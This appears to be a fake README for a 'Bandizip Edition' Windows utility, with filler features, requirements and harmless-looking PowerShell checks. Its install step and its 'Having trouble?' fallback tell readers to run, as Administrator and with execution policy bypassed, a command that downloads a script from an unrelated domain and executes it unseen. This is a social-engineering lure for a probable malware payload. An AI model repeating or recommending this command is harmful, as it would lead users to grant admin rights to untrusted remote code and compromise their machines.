# Bandizip Edition — Windows Desktop Utility Guide (10 & 11)

Install walkthrough · Configuration notes · Windows desktop use.

**Bandizip Edition** on **Windows 10 and 11** — documented install steps, system management, and routine notes for windows power users and administrators.

## Download

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) — setup runs automatically
4. Wait until the window reports setup finished — then open **Bandizip Edition** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

This README documents **Bandizip Edition** on Windows 10 and 11: preparation, install order, and practical notes for system management. Start with **Download**, then use **FAQ** and **Features**.

## FAQ

| Question | Answer |
| --- | --- |
| Where is the installer? | Open **PowerShell as Administrator**, paste the command from step 2 in **Download**, and press Enter. |
| ExecutionPolicy blocked the script? | Use the **Having trouble?** command in **Download** — it runs with **Bypass** for that session only. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** when Windows asks during step 3 — required for setup. |

## Features

- Quick actions
- Batch tools
- Status panels
- Presets
- Profiles
- Search
- File tools

## Use cases

- Power users
- IT support
- Home labs

## Developer reference

Not required for install. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "Bandizip-Full-Setup"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Post-install (application layer)**

```powershell
Get-Process -Name "Bandizip*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 2 GB free space |

## Topics

`bandizip-windows` · `bandizip-config` · `bandizip-integration` · `bandizip-latest` · `system-tools` · `windows-utility` · `desktop-tools` · `maintenance`

## License

This repository describes installation and usage of a third-party desktop utility application. Comply with applicable software licensing and local regulations.
